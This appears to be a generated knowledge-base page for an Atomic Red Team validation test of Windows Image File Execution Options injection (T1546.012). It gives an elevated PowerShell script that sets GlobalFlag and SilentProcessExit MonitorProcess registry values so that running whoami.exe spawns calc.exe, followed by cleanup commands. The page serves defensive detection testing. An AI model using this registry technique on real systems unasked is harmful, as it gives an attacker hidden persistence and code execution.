---
atomic_guid: "13117939-c9b2-4a43-999e-0a543df92f0d"
title: "GlobalFlags in Image File Execution Options"
framework: "atomic"
generated: "true"
attack_technique_id: "T1546.012"
attack_technique_name: "Event Triggered Execution: Image File Execution Options Injection"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.012/T1546.012.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "13117939-c9b2-4a43-999e-0a543df92f0d"
  - "GlobalFlags in Image File Execution Options"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

The following Atomic Test will create a GlobalFlag key under Image File Execution Options, also a SilentProcessExit Key with ReportingMode and MonitorProcess values. This test is similar to a recent CanaryToken that will generate an EventCode 3000 in the Application log when a command, whoami.exe for example, is executed.
Upon running Whoami.exe, a command shell will spawn and start calc.exe based on the MonitorProcess value. 
Upon successful execution, powershell will modify the registry and spawn calc.exe. An event 3000 will generate in the Application log.

## ATT&CK Mapping

- [[kb/attack/techniques/T1546-event_triggered_execution#^t1546012-image-file-execution-options-injection|T1546.012: Image File Execution Options Injection]]

## Input Arguments

### cmd_to_run

- description: Command to execute

- type: string
- default: cmd.exe /c calc.exe

### process

- description: Process to monitor

- type: string
- default: whoami.exe

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
$Name = "GlobalFlag"
$Value = "512"
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{process}"
New-Item -Path $registryPath -Force
New-ItemProperty -Path $registryPath -Name $Name -Value $Value -PropertyType DWord -Force
$Name = "ReportingMode"
$Value = "1"
$SilentProcessExit = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{process}"
New-Item -Path $SilentProcessExit -Force
New-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force 

$Name = "MonitorProcess"
$Value = "#{cmd_to_run}"
New-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType String -Force
Start-Process whoami.exe
```

### Cleanup

```powershell
$SilentProcessExit = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{process}" 
Remove-Item $SilentProcessExit -force
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{process}"
Remove-Item $registryPath -force
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.012/T1546.012.yaml)
